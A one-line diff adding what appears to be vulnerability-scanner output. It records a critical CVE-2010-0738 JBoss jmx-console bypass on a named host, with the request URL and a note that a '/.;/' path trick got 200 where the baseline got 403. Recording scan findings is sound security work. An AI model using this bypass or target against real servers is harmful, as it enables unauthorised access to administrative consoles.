@@ -1,0 +1,1 @@
+[CVE-2010-0738:jmx-console-path-normalization-bypass] [http] [critical] https://contributor.magnific.com/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system:type=ServerInfo ["jmx-console /.;/ bypass: normalized=200 baseline=403"]
